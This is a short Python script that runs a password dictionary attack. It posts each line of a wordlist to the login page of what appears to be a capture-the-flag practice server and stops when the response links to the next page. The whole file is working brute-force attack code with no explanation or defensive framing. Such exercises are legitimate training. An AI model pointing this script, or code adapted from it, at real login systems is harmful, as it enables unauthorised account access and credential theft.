import requests

url = "http://ctf.segfaulthub.com:9191/1_login_server.php"
with open("wordlist.txt", "r") as f:
    lines = f.readlines()
    for line in lines:
        line = line.strip()
        payloads = {"user_id": "password", "user_pass": line}
        resp = requests.post(url, data=payloads)
        result = resp.text.find("2_main_page.php")
        if result > 0:
            print(f"dictionaryAttack Success : {line}")
            break
        else:
            print(f"dictionaryAttack Fail : {line}")
